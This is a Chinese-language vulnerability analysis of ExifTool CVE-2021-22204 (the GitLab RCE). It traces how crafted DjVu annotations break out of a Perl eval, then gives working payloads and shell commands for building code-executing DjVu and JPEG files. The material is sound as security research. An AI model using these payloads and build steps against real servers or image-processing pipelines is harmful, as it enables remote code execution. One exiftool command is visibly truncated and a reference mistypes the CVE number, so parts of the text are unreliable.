### 优化后的文本

#### 图中说明
`$` 匹配字符串的末尾，或在字符串末尾换行符之前。也就是说，这里没有匹配到最后的换行符，而是匹配到了之前的单数个反斜杠。根据源码第二步的分析：
> 单数个反斜杠说明该段内容中存在被转义的引号，则拼接一个引号到字符串中继续进行循环。

实际上，这里的引号由于换行符的原因并没有被正确转义，紧接着拼接了下一个引号之间的内容，最后使用转义符来结束 payload：
```perl
. `calc` .\
# 结果为
\ ". `calc` .\"g
```
这时带入 `eval` 后已经成功脱离字符串上下文，我们就可以使用反引号执行任意代码。

在修改版函数中运行该 payload 的结果为：
- 首次进入变量内容为：`(metadata "\ ". `calc` .\"g"`
- 获取的非空字符串为：`(`
- 进入递归解析
- 首次进入变量内容为：`(metadata "\ ". `calc` .\"g"`
- 获取的非空字符串为：`m`
- 获取的非空字符串为：`"`
- 进入子串解析
- 循环子串解析
  - 上一个引号偏移量为：11
  - 第二个引号偏移量为：14
  - 切割字符串为：`(metadata "\ ". `calc` .\"g"`, 起始位置为: 11, 长度为: 2
  - 切割后的字符串为：`\`
  - 如果是奇数个反斜杠结尾，则添加引号字符串为：`\"`
- 循环子串解析
  - 上一个引号偏移量为：14
  - 第二个引号偏移量为：24
  - 切割字符串为：`(metadata "\ ". `calc` .\"g"`, 起始位置为: 14, 长度为: 9
  - 切割后的字符串为：`\ ". `calc` .\=+ \". `calc` .\`
  - 如果是奇数个反斜杠结尾，则添加引号字符串为：`\ ". `calc` .\"`
- 循环子串解析
  - 上一个引号偏移量为：24
  - 第二个引号偏移量为：26
  - 切割字符串为：`(metadata "\ ". `calc` .\"g"`, 起始位置为: 24, 长度为: 1
  - 切割后的字符串为：`\ ". `calc` .\"g=\ ". `calc` .\"+g`
- `eval` 执行前为：`\ ". `calc` .\"g`
- `eval` 执行后为：`SCALAR(0x3a8a5b0)`
- 进入递归结果为：`ARRAY(0x3a8c8a0)`

关于此类 payload 的发现可以参考以下两篇文章：
- **An Image Speaks a Thousand RCEs: The Tale of Reversing an ExifTool CVE** [8]
- **CVE-2021-22204 - Recreating a critical bug in ExifTool, no Perl smarts required** [9]

其中列出了 fuzz 过程，这里就不进行深入了。实测通过关键位置特殊字符 fuzz 可以触发代码执行。

还有一类 payload 为：
```perl
(metadata(Copyright "\c${system(calc)}")
```
下面来看执行结果：
- 切割后的字符串为：`\c${system(calc)}=+\c${system(calc)}`
- `eval` 执行前为：`\c\${system(calc)}`
- `eval` 执行后为：

当字符 `$` 进入正则 `s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge` 时会被添加转义符变为 `\`$`。这时正好和前面的 `\c` 组成了 `\c\`。查看 **Perl 文档：Quote and Quote-like Operators** [10]，从上图中得知在 Perl 中 `\c+字符` 可以映射到其他字符，计算公式为 `chr(ord("字符") ^ 64)`。带入 `\` 得到 `chr(ord("\\") ^ 64)`，如下：
- `\c\` 会得到 FS (File Separator) 文件分割符，这时用来转义的反斜杠就被吃掉了导致转义失败。

关于此类 payload 的发现可以参考以下文章：
- **From Fix to Exploit: Arbitrary Code Execution for CVE-2021-22204 in ExifTool** [11]

其中同样列出了 fuzz 过程。

## 漏洞利用
### DjVu 文件生成
查看 DjVu.pm 中的相关函数注释 `Process DjVu annotation chunk (ANTa or decoded ANTa)` 得知本次漏洞出现在解析 DJVU 文件的注释块 `ANTa` 或者 `ANTz` 过程中。关于该注释块的解释在文档 **DJVU3 FILE STRUCTURE OVERVIEW** [12] 有所提及。

文档 **DJVUMAKE** [13] 中指出 `djvumake` 可以生成 DjVu 图像文件，使用 `djvumake` 生成需要包含 `Sxxx` 或 `BGxx` 块，它们可以指向一个文件。使用命令 `sudo apt-get install -y djvulibre-bin` 安装 djvu 套件。经测试 `BGjp` 和 `BG2k` 块可以指定任意文件，但关于 `ANTa` 块的插入文档并没有提及。查看 **DjVumake 源码** [14] 发现隐藏参数。

于是我们可以通过如下命令生成带有 payload 的 DjVu 文件，其中需要使用 INFO 参数指定长宽：
```bash
$ printf '(metadata "\\\n".`echo 2>/tmp/2`.\\"g"' > rce.txt
$ djvumake rce.djvu INFO=0,0 BG2k=/dev/null ANTa=rce.txt
$ exiftool rce.djvu
```

另外也可以通过 **openwall** [15] 此处公布的命令来创建 POC，生成一个 pbm 格式文件后就可以通过套件中的 `cjb2` 将 pbm 转换为 DjVu，最后再追加 `ANTa` 注释块：
```bash
$ printf 'P1 1 1 0' > moo.pbm
$ cjb2 moo.pbm moo.djvu
$ printf 'ANTa\0\0\0\36"(xmp(\\\n".qx(echo 2>/tmp/4);#"' >> moo.djvu
$ exiftool moo.djvu
```

需要注意 `ANTa\0\0\0\36` 中的 `36` 为 `ANTa` 块中数据的八进制长度，图例如下：

### JPEG 文件生成
同样在源码中发现解析 JPG 文件过程中对元数据标签 `HasselbladExif(0xc51b)` 存在递归解析，这时就需要寻找将 DjVu 文件插入到 `HasselbladExif` 标签中的方法。原作者文章中指出了一种方法，在 **exiftool 官方配置文档** [16] 中也可以查询到相关用法，通过编写 exiftool 配置文件来自定义标签表。

配置文件如下，保存为 `configfile`：
```perl
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
```

通过如下命令来加载配置文件插入 DjVu 文件到指定标签内，从而生成带有 payload 的正常 JPG 文件：
```bash
exiftool -config configfile '-HasselbladExif trce.jpg
```

首先插入 `GeoTiffAsciiParams` 标签后通过 `exiftool -v10 tim22g.jpg` 查看其标签 ID 为 `0x87b1`，然后使用 `sed` 命令替换为 `0xc51b` 即可，如下图：

可以通过其他安全研究员编写的脚本来一键生成，只需要一张图片即可。GitHub 地址为：**AssassinUKG/CVE-2021-22204** [17]。脚本中插入的 DjVu 注释块是 `ANTz`，使用了 Bzz 压缩，压缩后不具有文本可读性，如下图：

## 漏洞修复
**12.24 版本的更新** [18]：
上图中可以看到更新后采用了硬编码的形式通过搜索和替换来处理 C 转义字符，并且删除了 `eval` 函数，彻底修复了此处的漏洞。

## 总结
本篇分析下来可以看到在此漏洞的利用中可以使用多种多样的方式。对于软件功能技术、安全防护日新月异的今天，看似漏洞挖掘利用越来越难以进行，其实考验我们的是思维的发散程度以及对底层知识掌握的广度与深度。万变不离其宗，以不变才能应万变。

## 参考资料
[1] hackerone gitlab rce: 
[2] gitlab 在野利用: 
[3] 官方漏洞通告: 
[4] 图像元数据（Metadata） ——Exif 信息分析:
[5] exiftool 源码: 
[6] CVE-2021-22204 - ExifTool RCE 详细分析(漏洞原作者翻译版本):
[7] Metacharacters: 
[8] An Image Speaks a Thousand RCEs: The Tale of Reversing an ExifTool CVE:
[9] CVE-2021-22204 - Recreating a critical bug in ExifTool, no Perl smarts required: 
[10] Quote and Quote-like Operators:
[11] From Fix to Exploit: Arbitrary Code Execution for CVE-2021-22204 in ExifTool: 
[12] DJVU3 FILE STRUCTURE OVERVIEW:
[13] DJVUMAKE: 
[14] DjVumake Source:
[15] openwall: 
[17] AssassinUKG/CVE-2021-22204:
[18] 12.24 版本的更新:
[19] ExifTool 完全入门指南: 
[20] Description of Exif file format:
[21] JPEG 文件格式解析(一) Exif 与 JFIF:
[22] 关于 EXIF 格式的分析: 
[23] TIFF 规范，修订 6.0:
[24] GitLab 未授权 RCE 分析 Part 1：ExifTool: 
[25] CVE-2021-22205：Gitlab RCE 分析之一：ExifTool CVE-2021-22004 起源:
[https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&mid=2247485285&idx=1&sn=647634dd0de8ea875c80bd714ac570ef](https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&mid=2247485285&idx=1&sn=647634dd0de8ea875c80bd714ac570ef)
[26] RCE in GitLab when removing metadata using ExifTool:
[27] A case study on: CVE-2021-22204 – Exiftool RCE:
[28] Analyse de la vulnérabilité CVE-2021-22205:
[29] RCE in GitLab via 0day in exiftool metadata processing library CVE-2021-22204:
[https://www.youtube.com/watch?v=YYLqzj5-N7w&t=103s](https://www.youtube.com/watch?v=YYLqzj5-N7w&t=103s)